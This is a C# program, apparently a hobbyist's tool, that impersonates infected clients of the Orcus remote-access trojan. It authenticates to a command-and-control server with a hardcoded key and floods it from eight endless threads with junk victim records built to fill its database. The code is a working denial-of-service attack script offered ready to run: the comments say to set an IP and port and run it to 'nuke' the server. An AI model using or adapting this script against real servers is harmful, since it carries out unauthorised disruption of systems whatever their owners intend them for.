// I don't really use C#. I wrote this for fun and have no clue what proper C# conventions are. Apologies for the ugly code.

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using orcinnect;
using Orcus.Shared.Core;
using Orcus.Shared.NetSerializer;

// Just download their server software, build a CLI server, add it as a reference. 
// I'm not including it with the repository for reasons that should be obvious.
// Change the IP address and port, then run the project to nuke the C&C server.

namespace application
{
    internal class Program
    {
        private static int iterations;

        // shamelessly copypasted from stackoverflow
        public static string randomString(int length)
        {
            var random = new Random();
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
               .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static void doTheThing()
        {
            var client = new TcpClient();
            SslStream sslStream = null;
            try
            {

                client.Connect("13.37.13.37", 1337); 
                sslStream = new SslStream(client.GetStream(), true, (o, certificate, chain, errors) => true);
                sslStream.AuthenticateAsClient("Hello.");
            }
            catch
            {
                Console.WriteLine("Failed to connect. Server dead?");
                return;
            }

            sslStream.Write(new byte[] {0}); // client
            var binaryReader = new BinaryReader(sslStream);
            var binaryWriter = new BinaryWriter(sslStream, Encoding.UTF8, true);
            binaryWriter.Write(5); // we're using api v5
           
            binaryReader.ReadByte();
            if (binaryReader.ReadByte() != 0)
            {
                Console.WriteLine("Error? 1");
                return;
            }

            int         position    = binaryReader.ReadInt32();
            KeyDatabase keyDatabase = new KeyDatabase();

            binaryWriter.Write(keyDatabase.GetKey(position, "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh"));
            if (binaryReader.ReadByte() != 6)
            {
                Console.WriteLine("Error? 2");
                return;
            }
    
            var provider  = new RNGCryptoServiceProvider();
            var hwidSalt  = new byte[4];
            provider.GetBytes(hwidSalt);
            
            //hwid
            binaryWriter.Write("foo bar baz buzz" + BitConverter.ToUInt32(hwidSalt, 0).ToString()); // arbitrary
            byte b = binaryReader.ReadByte();
            if (b == 7)
            {
                if (new Random().Next(0, 5) < 3)
                {
                    binaryWriter.Write("");
                }
                else if (new Random().Next(0, 5) < 1)
                {
                    binaryWriter.Write(randomString(255));
                }
                else
                {
                    binaryWriter.Write(randomString(2) + new string('\n', 252));
                }

                b = binaryReader.ReadByte();
            }

            if (b != 3)
            {
                Console.WriteLine("Error 3?");
                return;
            }

            var randomKiloByte = new byte[2048];
            provider.GetBytes(randomKiloByte);
            var information = new BasicComputerInformation()
            {
                UserName             = randomString(new Random().Next(0, 255)),
                // you can just put in TempleOS too or randomString(256)
                OperatingSystemName  = "Microsoft Windows 10 Pro",
                Language             = "English (United States)",
                IsAdministrator      = new Random().Next(3) != 1,
                ClientConfig         = null,
                ClientVersion        = new Random().Next(19),
                ApiVersion           = 2,
                ClientPath           = new string('\a', 10000),
                FrameworkVersion     = 1,
                MacAddress           = randomKiloByte // wastes space in their database
            };
            
            new Serializer(new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes())
            {
                typeof(BasicComputerInformation)
            }).Serialize(sslStream, information);
            
            
            Console.WriteLine($"Connected fake client #{++iterations}");
        }

        public static void Main(string[] args)
        {
            for (int i = 0; i < 8; i++)
            {
                new Thread(() =>
                {
                    while (true) doTheThing();
                }).Start();
            };
        }
    }
}
